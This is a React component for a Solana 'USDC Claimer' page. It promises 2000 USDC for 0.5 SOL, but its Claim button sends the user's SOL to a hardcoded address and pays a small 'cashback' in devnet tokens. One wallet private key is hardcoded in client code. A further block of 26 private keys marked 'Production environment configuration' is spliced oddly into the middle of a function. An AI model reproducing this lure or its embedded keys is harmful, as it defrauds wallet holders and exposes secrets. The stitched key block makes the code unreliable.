/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4jV32SZL7CxBaxiWRu1ci8yV6U8vhuu8EtcM73YS7Vjye4M6NFLkn8gCG7wFK1H1Zhixvse9DSdXMHoFmypt5CnY"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4ur4t4VYHn5tvdZupPb2LY5HRpzQZC688zJEjsLDN1UtZ1CAARqP41XDsHp1KP3yCDGQHRLAetXLAmSwnR12kXzM",
  "key1": "5HjKvuQmPDaJdEMg2sQXLFCJWohVGC9PvsmfNQhDDHzkn43ZnoAW9ZfgJh9c86QsgZgT47NPG8ft1bBiAiMNaoBi",
  "key2": "4nr9ehvRJjMyNvmCHjpjZ5vR74egCNpGi37qhz8H6azQY5qcDFtRh6Xj37XeZrF9qFkx3vQRzpCaenhomToJmQKJ",
  "key3": "44eicQnfs8bztbYcKRLpSJAsiuJkPUg8mPkw5VHs8FLCPDUpyCAZ9a8KHzqWvi4bYoEeZymQy3hc6s5uQHXBA6Tj",
  "key4": "2xpqi9fnLBX6ap2vgHUwukaHxX2BoYGCxkMvoFkDoMRveW8cELF714G6jPsForAuj7C48cnb5c2CCLjME4NyMR9Q",
  "key5": "3SFg6DRQZA6sLKga9iywcyuQFRthj6kkfm9C9WVuLK3qxScGKHN6PqVyN7L2W5i4omkuwBb7X9vFbfirdPi6zbmJ",
  "key6": "3K5uG7Xz3Peuc5siP1U8tpzwViLZibiHD2HjYCPuy8ZHt8o5SqQtF42xoCJ5MEvZL82c4abRiFiLV2EC7M7dhHUB",
  "key7": "3Mbkf4JYzc5FRMsxPyqoSASZUUyoWFQTFLNmvq4cNfxw5W1EWyRjdsT7UpvDdA9d7iyki6xxdPa2Jhrzv3WZCg3v",
  "key8": "2Z5XVWXdBMq5z3f45rgeBErCjZiJW9f3qz5NBzpjxP4jg4fGtdqggqojteSCLsic4ukVsZvA4asRMMwdMmxY7xsQ",
  "key9": "2vcd1yczA8kZSvMyHQdGjZ884M9EF7utSX7EMJ9Pf5RmPuqerHPLMi5burtPARWuUQbScJzj6risQy7CVmcqZpQF",
  "key10": "4zN9Vg2gwa2YXhcztnT1GFgckp1EBin7X7XB3L2ZGZYnipGstzZ5jsLhYJq8KsAJY9GaEEekv5RqFkMmReMBTnJq",
  "key11": "3qYbzLERQcdjdU7CPGmXqq86iCkSJAcGbtKN5c9h66noJAm5mSzjiWuRRo6yduHfxbBSivNeYJ1DeuGJy6bsYN6W",
  "key12": "5RuEFMezRQika9HcXm1fsSy6mWQETw57Jz9jcJEkZ945QqiGeso4YfNUGMtHYa2MNvr64swUY2Yt6Q1YxW7mKE2q",
  "key13": "4MfQGX4jpjdUcbCrgx5CefuWG1sF12y7gcjZk4sKM8jy8SLdkCVYrtjYvpUsVsnMvN3cSbKfpuZyaj9UkLUBbgjo",
  "key14": "61N2PcdytxEFJxECZEE5iP43V2vxVqRjyLvxTQWXMbk7QCtkA9iRiStRnjR1HfBk2GiFkSztvjypCeAU2AFLKb7q",
  "key15": "2MbcxsLWh2a31vpHCd41iYNF1FtrbUVoqBtEkTU1Q3296g6ronzq2PnRZk7cwraYxgBRwX8KYSm1d8q3rS2HbKYb",
  "key16": "2k7GcPR8SgQisbbSy2RCqkLpJ8YgGo8nrLeoGDjVtkujxtVL4ruUBLisJ6HKTtSPd8wXnAuuVZaJGbz2NfDSpZfX",
  "key17": "3AQaMAfkq7rqFDdWymVjWdcBx7XJHGuFuZpN3esWmjnL5VdowfPMwmQApuWDHBUDVbSSmZKTNKt3Loz9nniPS3Tk",
  "key18": "3LFVQgyeYgfxptXjgCz7XRUgkKVaPLAtd5hWqaQNv2Qw9uu5go86GtFUWRqjZvUJxnCtU32JC8JA4Qz7mTYPNzDK",
  "key19": "5CUzEU26bcZ5RDNLeS1A3aMnXBinX1cy4zTAtkmVxoZSD8gy8GwboPkaCGCQ92cy46XrFyhjrRYavJVfCNYbpD3p",
  "key20": "qzUvi52923t9tLieck9rmfq6MJwxv8QxEXiX7RDtTgJdTLjWfkm8F8KpfFDvpBXyzDe77LzMsdaoPJsG9SEBrrb",
  "key21": "5Yfy7H7NW4s4pHV8VHgNkq6XSVduFHKWyY2fVrRsQzJ3x7Jb7JP8ydiKMhTavuAwMEzn53d5BsLzx3665aCrMbFB",
  "key22": "4i9gstxpH7UcvCeNUve25GgTqzqvwmhZWGTmUZXSGnNt567T2oCSDUxTumMzCPwiHazMtKTnyy6Nsy3eg3bD3B9j",
  "key23": "rYbUb9BTXDvT5h1uGSyWSnrfzjC19C42vTp1uT2MaSonqqC6KSZ94RcQXvfuGhY9zJjiSEsFYuNQTv9DJV3EQz6",
  "key24": "2Y6uPXsc77CsJZxiGd9Wy38eiD3FPL4h4F7oepBVXjV8bT62YTiou14iFXN53x55fcyWqMtd7BqFW1dTQXzFDEoK",
  "key25": "q35NtkUaFeRbkqBVtNa7XeFvVwTmKSutfZW9kfGqLm1TVoqquttNMrhhCrnFqRACjwZWboTZyZUXHftZ4ycXGpE"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
